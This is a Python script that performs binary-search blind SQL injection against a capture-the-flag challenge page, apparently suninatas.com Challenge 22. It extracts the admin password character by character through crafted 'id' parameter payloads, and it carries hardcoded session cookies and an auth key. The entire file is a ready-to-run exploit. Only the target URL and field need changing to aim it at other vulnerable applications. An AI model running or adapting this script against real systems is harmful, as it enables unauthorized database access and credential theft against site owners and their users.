#!/usr/bin/env python3
"""
Blind SQL Injection Script (Binary Search Edition)
Optimized extraction using ASCII comparisons (greater than / less than).
Target: suninatas.com Challenge 22
"""

import requests
import string
import sys

# --- Configuration ---
TARGET_URL = "http://suninatas.com/challenge/web22/web22.asp"
COOKIES = {
    "ASP.NET_SessionId": "3g042optmn40uhuoxlqhkvai",
    "ASPSESSIONIDACTRACSS": "MEJDPMPAHECDELCJCFEOEINE",
    "ASPSESSIONIDCCTSAAQT": "NNMDDJIBCMFACGADEKFHFNCA",
    "ASPSESSIONIDQSBTDCST": "DNDPAPJCEPOJPKPFACBKBPKJ",
    "auth_key": "65038b0559e459420aa2d23093d01e4a",
    "ASPSESSIONIDAARSBCRR": "NNOJOPPCBMOBJCNACCPNBHIP",
    "ASPSESSIONIDCCTQCCSR": "FLDDKMEDLOFIPEODAHAPDDID",
    "ASPSESSIONIDCCRRBDTT": "AGEJLNGDPEFCCNCGDHAPBLEH"
}

MAX_LENGTH = 31
SUCCESS_INDICATOR = "OK"

def check_condition(payload_condition):
    """Executes the request with the given SQL condition and returns True if successful."""
    payload = f"' and ({payload_condition})--"
    params = {'id': f'admin{payload}', 'pw': 'a'}
    
    try:
        response = requests.get(TARGET_URL, params=params, cookies=COOKIES, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except requests.RequestException:
        return False

def main():
    print(f"[*] Starting Optimized Blind SQL Injection on {TARGET_URL}")
    extracted_string = ""

    for i in range(1, MAX_LENGTH + 1):
        low = 32   # Space
        high = 126 # ~
        current_char_code = 0
        
        # Check if we've hit the end of the string
        if not check_condition(f"len(pw)>={i}"):
            print(f"[*] Reached end of string at index {i-1}.")
            break

        sys.stdout.write(f"[*] Finding char {i:02}: ")
        sys.stdout.flush()

        # Binary search for the ASCII value
        while low <= high:
            mid = (low + high) // 2
            if check_condition(f"ascii(substring(pw,{i},1))>{mid}"):
                low = mid + 1
            else:
                current_char_code = mid
                high = mid - 1
        
        char = chr(current_char_code)
        extracted_string += char
        sys.stdout.write(f"{char} (ASCII: {current_char_code})\n")
        sys.stdout.flush()

    print("\n" + "="*30)
    print(f"FINAL PASSWORD: {extracted_string}")
    print("="*30)

if __name__ == "__main__":
    main()
